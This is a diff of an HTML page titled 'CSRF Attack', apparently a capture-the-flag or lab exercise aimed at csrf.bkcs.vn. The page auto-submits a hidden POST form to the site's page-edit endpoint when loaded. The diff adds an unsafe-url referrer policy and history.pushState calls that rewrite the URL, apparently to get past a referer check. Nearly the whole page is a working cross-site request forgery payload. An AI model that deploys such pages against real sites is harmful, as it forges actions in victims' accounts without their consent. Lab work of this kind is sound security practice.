@@ -2,12 +2,17 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    
+    <meta name="referrer" content="unsafe-url">
+    
+    
     <title>CSRF Attack</title>
     <link rel="stylesheet" href="styles.css">
 </head>
 <body>
-    <h1>Hacked by Gnas</h1>
+    <script>history.pushState('', '', '/')</script>
+    
     <form method="post" action="http://csrf.bkcs.vn/action/pages/edit">
         
         <!-- <button class="button-5" type="submit" role="button">Click here to chat</button> -->
@@ -25,8 +30,9 @@
         <br>
         <input type="hidden" name="parent_guid" value="0">
     </form>
-
+    
     <script>
+        history.pushState("", "", "?csrf.bkcs.vn")
         document.forms[0].submit();
     </script>
 </body>
